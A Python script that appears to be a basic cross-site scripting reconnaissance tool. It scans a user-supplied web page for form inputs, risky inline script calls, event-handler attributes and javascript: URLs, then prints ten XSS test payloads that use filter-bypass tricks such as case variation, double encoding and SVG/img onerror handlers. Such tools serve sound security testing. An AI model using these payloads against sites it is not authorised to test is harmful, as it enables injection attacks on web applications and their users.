import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse

def analyze_page(url):
    try:
        # Fetch the webpage
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        # Parse with BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Common vulnerable attributes and patterns
        vulnerable_attributes = [
            'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeypress'
        ]
        
        # Check forms
        forms = soup.find_all('form')
        form_vulnerabilities = []
        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                if input_tag.get('type') in ['text', 'search', 'email', 'url']:
                    form_vulnerabilities.append({
                        'action': form.get('action', ''),
                        'method': form.get('method', ''),
                        'input_name': input_tag.get('name', '')
                    })
        
        # Check script tags
        scripts = soup.find_all('script')
        script_vulnerabilities = []
        for script in scripts:
            if script.string:
                if any(keyword in script.string.lower() for keyword in ['eval(', 'document.write', 'innerHTML']):
                    script_vulnerabilities.append({
                        'content': str(script)[:100] + '...'  # Truncated for brevity
                    })
        
        # Check event handlers
        event_vulnerabilities = []
        for tag in soup.find_all(True):
            for attr in vulnerable_attributes:
                if tag.get(attr):
                    event_vulnerabilities.append({
                        'tag': tag.name,
                        'attribute': attr,
                        'value': tag.get(attr)
                    })
        
        # Check URLs in attributes
        url_vulnerabilities = []
        for tag in soup.find_all(True):
            for attr in ['href', 'src', 'data']:
                if tag.get(attr) and 'javascript:' in tag.get(attr).lower():
                    url_vulnerabilities.append({
                        'tag': tag.name,
                        'attribute': attr,
                        'value': tag.get(attr)
                    })
        
        return {
            'forms': form_vulnerabilities,
            'scripts': script_vulnerabilities,
            'events': event_vulnerabilities,
            'urls': url_vulnerabilities
        }

    except Exception as e:
        return {'error': str(e)}

# Suggested XSS payloads based on common bypass techniques
def get_xss_payloads():
    payloads = [
        # Basic XSS
        '<script>alert(1)</script>',
        # HTML attribute bypass
        '" onmouseover="alert(1)"',
        # Case variations
        '<ScRiPt>alert(1)</sCrIpT>',
        # HTML entity encoding
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        # JavaScript URL
        'javascript:alert(1)',
        # Event handlers
        '<img src=x onerror=alert(1)>',
        # SVG bypass
        '<svg onload=alert(1)>',
        # Double encoding
        '%253Cscript%253Ealert(1)%253C/script%253E',
        # Unicode bypass
        '<script\u003Ealert(1)</script>',
        # Null byte
        '<script>alert(1)\0</script>'
    ]
    return payloads

# Main execution
def main():
    target_url = input("Enter url:")
    #"https://medium.com/@saltify/from-alert-1-to-account-takeover-a-story-of-4-digit-bounties-and-bypassing-html-sanitisers-dd8ca0ac502b"
    
    print(f"Analyzing: {target_url}")
    results = analyze_page(target_url)
    
    if 'error' in results:
        print(f"Error: {results['error']}")
        return
    
    # Print results
    print("\nPotential Vulnerabilities Found:")
    
    if results['forms']:
        print("\nForm Inputs:")
        for form in results['forms']:
            print(f"- Action: {form['action']}, Method: {form['method']}, Input: {form['input_name']}")
    
    if results['scripts']:
        print("\nScript Issues:")
        for script in results['scripts']:
            print(f"- Suspicious script content: {script['content']}")
    
    if results['events']:
        print("\nEvent Handlers:")
        for event in results['events']:
            print(f"- Tag: {event['tag']}, Attribute: {event['attribute']}, Value: {event['value']}")
    
    if results['urls']:
        print("\nSuspicious URLs:")
        for url in results['urls']:
            print(f"- Tag: {url['tag']}, Attribute: {url['attribute']}, Value: {url['value']}")
    
    # Suggest payloads
    print("\nSuggested XSS Payloads to Test:")
    for payload in get_xss_payloads():
        print(f"- {payload}")

if __name__ == "__main__":
    main()
